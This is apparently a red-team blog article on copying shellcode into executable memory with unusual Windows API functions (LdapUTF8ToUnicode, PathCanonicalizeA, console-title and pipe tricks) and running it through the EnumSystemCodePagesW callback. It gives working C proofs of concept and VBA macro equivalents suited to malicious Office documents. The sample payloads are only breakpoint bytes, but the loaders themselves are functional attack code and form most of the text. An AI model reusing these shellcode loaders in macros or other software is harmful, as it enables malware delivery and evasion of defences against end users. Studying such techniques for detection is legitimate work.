To achieve it the VBA macro used UuidFromStringA to copy the shellcode to the RWX region and then triggered its execution via lpLocaleEnumProc . The lpLocaleEnumProc was previously documented by @noottrak in his article “Abusing native Windows functions for shellcode execution”.\n\n Using alternatives ways to copy the shellcode is nothing new, even there are a few articles about discussing it for inter-process injections (Inserting data into other processes’ address space by @Hexacorn, GetEnvironmentVariable as an alternative to WriteProcessMemory in process injections by @TheXC3LL and Windows Process Injection: Command Line and Environment Variables by @modexpblog, just to metion a few).\n\n Returning to @nootrak’s article we can find a list of different native functions which can be used to trigger the execution, and even a tool to build maldocs where the functions used to allocate, copy, and execute the shellcode are randomly chosen. Quoted from the article:\n\n I’m calling trigen (think 3 combo-generator) which randomly puts together a VBA macro using API calls from pools of functions for allocating memory (4 total), copying shellcode to memory (2 total), and then finally abusing the Win32 function call to get code execution (48 total - I left SetWinEventHook out due to aforementioned need to chain functions). In total, there are 384 different possible macro combinations that it can spit out.\n\n The tool uses only 2 native functions to copy the shellcode, when there are dozens of them that can be used. So the number of possible combinations can grow A LOT.\n\n In an extremely abstract way we can label the functions that can be (ab)used in two labels: one-shot functions and two-shot functions. The first family of functions are those that let you copy the shellcode directly to the desired address (for example, UuidFromStringA used by Lazarus); meanwhile two-shot functions are those where the copy has to be done in two-steps: first copy the shellcode to no man’s land, and then retrieve it (for example,\n```\nSetEnvironmentVariable / GetEnvironmentVariable )\n\n## One-shot functions\n\n```\n\n-----\n\n### Most of the functions falling into this category are functions used to convert info from format “A” to format “B”, or those applying any type of transformation to this info. This kind of functions can be spotted checking their arguments: if it receives an input buffer and an output buffer, it is a good candidate. Let’s check LdapUTF8ToUnicode for example:\n```\nWINLDAPAPI int LDAPAPI LdapUTF8ToUnicode(\n LPCSTR lpSrcStr,\n int  cchSrc,\n LPWSTR lpDestStr,\n int  cchDest\n);\n\n So, the parameters are:\nlpSrcStr - A pointer to a null-terminated UTF-8 string to convert.\nlpDestStr - A pointer to a buffer that receives the converted Unicode string, without\na null terminator.\n\n This is a good candidate that meets our criteria. We can test it with a simple PoC in C:\n#include <Windows.h>\n#include <Winldap.h>\n#pragma comment(lib, \"wldap32.lib\")\nint main(int argc, char** argv) {\n     LPCSTR orig_shellcode = \"\\xec\\xb3\\x8c\\xec\\xb3\\x8c\"; // \\xcc\\xcc\\xcc\\xcc in\nUNICODE\n     LPWSTR copied_shellcode = NULL;\n     HANDLE heap = NULL;\n     int ret = 0;\n     int size = 0;\n     heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);\n     copied_shellcode = HeapAlloc(heap, 0, 0x10);\n     size = LdapUTF8ToUnicode(orig_shellcode, strlen(orig_shellcode), NULL, 0); //\nFirst call is to know the size\n     ret = LdapUTF8ToUnicode(orig_shellcode, strlen(orig_shellcode),\ncopied_shellcode, size);\n     EnumSystemCodePagesW(copied_shellcode, 0); // Just to trigger the execution.\nTaken from Nootrak article.\n     return 0;\n}\n\n As this function works doing a conversion from UTF-8 to UNICODE, we have to craft our shellcode (in this case just a bunch of int3) keeping this in mind.\n\n```\n\n-----\n\n### Shellcode copied to our target RWX buffer. As we saw, it worked. It is time to translate the C code to the impious language of Mordor VBA:\n\n\n-----\n\n```\nPrivate Declare PtrSafe Function HeapCreate Lib KERNEL32 (ByVal flOptions As Long,\nByVal dwInitialSize As LongPtr, ByVal dwMaximumSize As LongPtr) As LongPtr\nPrivate Declare PtrSafe Function HeapAlloc Lib \"KERNEL32\" (ByVal hHeap As LongPtr,\nByVal dwFlags As Long, ByVal dwBytes As LongPtr) As LongPtr\nPrivate Declare PtrSafe Function EnumSystemCodePagesW Lib \"KERNEL32\" (ByVal\nlpCodePageEnumProc As LongPtr, ByVal dwFlags As Long) As Long\nPrivate Declare PtrSafe Function LdapUTF8ToUnicode Lib \"WLDAP32\" (ByVal lpSrcStr As\nLongPtr, ByVal cchSrc As Long, ByVal lpDestStr As LongPtr, ByVal cchDest As Long) As\nLong\nSub poc()\n  Dim orig_shellcode(0 To 5) As Byte\n  Dim copied_shellcode As LongPtr\n  Dim heap As LongPtr\n  Dim size As Long\n  Dim ret As Long\n  Dim HEAP_CREATE_ENABLE_EXECUTE As Long\n  HEAP_CREATE_ENABLE_EXECUTE = &H40000\n  '\\xec\\xb3\\x8c\\xec\\xb3\\x8c ==> \\xcc\\xcc\\xcc\\xcc\n  orig_shellcode(0) = &HEC\n  orig_shellcode(1) = &HB3\n  orig_shellcode(2) = &H8C\n  orig_shellcode(3) = &HEC\n  orig_shellcode(4) = &HB3\n  orig_shellcode(5) = &H8C\n  heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0)\n  copied_shellcode = HeapAlloc(heap, 0, &H10)\n  size = LdapUTF8ToUnicode(VarPtr(orig_shellcode(0)), 6, 0, 0)\n  ret = LdapUTF8ToUnicode(VarPtr(orig_shellcode(0)), 6, copied_shellcode, size)\n  ret = EnumSystemCodePagesW(copied_shellcode, 0)\nEnd Sub\n\n### Attach a debugger and run the macro!\n\n```\n\n-----\n\n### Macro\n\n executing our shellcode. Another example can be PathCanonicalize :\n```\nBOOL PathCanonicalizeA(\n LPSTR pszBuf,\n LPCSTR pszPath\n);\n\n The parameters meets our criteria:\npszBuf - A pointer to a string that receives the canonicalized path. You must set the\nsize of this buffer to MAX_PATH to ensure that it is large enough to hold the\nreturned string.\npszPath - pointer to a null-terminated string of maximum length MAX_PATH that\ncontains the path to be canonicalized.\n\n The PoC:\n\n```\n\n-----\n\n```\n#include <Windows.h>\n#include <Shlwapi.h>\n#pragma comment(lib, \"Shlwapi.lib\")\nint main(int argc, char** argv) {\n     LPCSTR orig_shellcode = \"\\xcc\\xcc\\xcc\\xcc\";\n     LPSTR copied_shellcode = NULL;\n     HANDLE heap = NULL;\n     BOOL ret = 0;\n     int size = 0;\n     heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);\n     copied_shellcode = HeapAlloc(heap, 0, 0x10);\n     PathCanonicalizeA(copied_shellcode, orig_shellcode);\n     EnumSystemCodePagesW(copied_shellcode, 0);\n     return 0;\n}\n\n### Aaand fire in the hole!\n\n```\n\n-----\n\n### Shellcode\n\n copied to RWX buffer using PathCanonicalizeA.\n\n## Two-shots functions\n\n### With this label we are referring to functions that first need to save the shellcode in a intermediate place, like an environment variable/window title/etc, and then retrieve it from that place. The easiest to spot are the Set/Get twins.\n\n A simple example that comes to our mind is saving the shellcode as a Console Tittle with\n```\nSetConsoleTitleA and then calling GetConsoleTitleA to save it in our RWX region:\n\n```\n\n-----\n\n```\n#include <Windows.h>\nint main(int argc, char** argv) {\n     LPCSTR orig_shellcode = \"\\xcc\\xcc\\xcc\\xcc\";\n     LPSTR copied_shellcode = NULL;\n     HANDLE heap = NULL;\n     BOOL ret = 0;\n     heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);\n     copied_shellcode = HeapAlloc(heap, 0, 0x10);\n     SetConsoleTitleA(orig_shellcode);\n     GetConsoleTitleA(copied_shellcode, MAX_PATH);\n     EnumSystemCodePagesW(copied_shellcode, 0);\n     return 0;\n}\n\n### Test it:\n\n```\n\n-----\n\n### Shellcode copied using a Set/Get pair. Also IPC mechanisms can fall into our “two-shots” category. For example, we can create an anonymous pipe to use it as no man’s place and call WriteFile / ReadFile to copy the shellcode:\n\n\n-----\n\n```\n#include <Windows.h>\nint main(int argc, char** argv) {\n     LPCSTR orig_shellcode = \"\\xcc\\xcc\\xcc\\xcc\";\n     LPSTR copied_shellcode = NULL;\n     HANDLE heap = NULL;\n     HANDLE source = NULL;\n     HANDLE sink = NULL;\n     SECURITY_ATTRIBUTES saAttr;\n     DWORD size = 0;\n     heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);\n     copied_shellcode = HeapAlloc(heap, 0, 0x10);\n     saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);\n     saAttr.bInheritHandle = TRUE;\n     saAttr.lpSecurityDescriptor = NULL;\n     CreatePipe(&sink, &source, &saAttr, 0);\n     WriteFile(source, orig_shellcode, 4, &size, NULL);\n     ReadFile(sink, copied_shellcode, 4, &size, NULL);\n     EnumSystemCodePagesW(copied_shellcode, 0);\n     return 0;\n}\n\n### It can be translated to VBA as:\n\n```\n\n-----\n\n```\nPrivate Declare PtrSafe Function HeapCreate Lib kernel32 (ByVal flOptions As Long,\nByVal dwInitialSize As LongPtr, ByVal dwMaximumSize As LongPtr) As LongPtr\nPrivate Declare PtrSafe Function HeapAlloc Lib \"kernel32\" (ByVal hHeap As LongPtr,\nByVal dwFlags As Long, ByVal dwBytes As LongPtr) As LongPtr\nPrivate Declare PtrSafe Function EnumSystemCodePagesW Lib \"kernel32\" (ByVal\nlpCodePageEnumProc As LongPtr, ByVal dwFlags As Long) As Long\nPrivate Declare PtrSafe Function CreatePipe Lib \"kernel32\" (phReadPipe As LongPtr,\nphWritePipe As LongPtr, lpPipeAttributes As SECURITY_ATTRIBUTES, ByVal nSize As Long)\nAs Long\nPrivate Declare PtrSafe Function ReadFile Lib \"kernel32\" (ByVal hFile As LongPtr,\nByVal lpBuffer As LongPtr, ByVal nNumberOfBytesToRead As Long, lpNumberOfBytesRead As\nLong, lpOverlapped As Long) As Long\nPrivate Declare PtrSafe Function WriteFile Lib \"kernel32\" (ByVal hFile As LongPtr,\nByVal lpBuffer As LongPtr, ByVal nNumberOfBytesToWrite As Long,\nlpNumberOfBytesWritten As Long, lpOverlapped As Long) As Long\nPrivate Type SECURITY_ATTRIBUTES\n    nLength As Long\n    lpSecurityDescriptor As LongPtr\n    bInheritHandle As Long\nEnd Type\nSub poc()\n  Dim orig_shellcode(0 To 3) As Byte\n  Dim copied_shellcode As LongPtr\n  Dim heap As LongPtr\n  Dim size As Long\n  Dim ret As Long\n  Dim source As LongPtr\n  Dim sink As LongPtr\n  Dim saAttr As SECURITY_ATTRIBUTES\n  Dim HEAP_CREATE_ENABLE_EXECUTE As Long\n  HEAP_CREATE_ENABLE_EXECUTE = &H40000\n  orig_shellcode(0) = &HCC\n  orig_shellcode(1) = &HCC\n  orig_shellcode(2) = &HCC\n  orig_shellcode(3) = &HCC\n  heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0)\n  copied_shellcode = HeapAlloc(heap, 0, &H10)\n  saAttr.nLength = LenB(SECURITY_ATRIBUTES)\n  saAttr.bInheritHandle = 1\n  saAttr.lpSecurityDescriptor = 0\n  ret = CreatePipe(sink, source, saAttr, 0)\n  ret = WriteFile(source, VarPtr(orig_shellcode(0)), 4, size, 0)\n  ret = ReadFile(sink, copied_shellcode, 4, size, 0)\n  ret = EnumSystemCodePagesW(copied_shellcode, 0)\nEnd Sub\n\n```\n\n-----\n\n## EoF\n\n### Although the topic discussed in this article is old, we tend to see always the same patterns (probably just because people repeats what it is highly shared in internet). We encourage to explore alternatives ways to do the things and not just follow blindly what others do.\n\n As Red Teamers we have to repeat TTPs seen in the wild but also we need to explore more paths. There are dozens of ways to copy and trigger your shellcode, just don’t stick to one and be creative!\n\n We hope you enjoyed this reading!
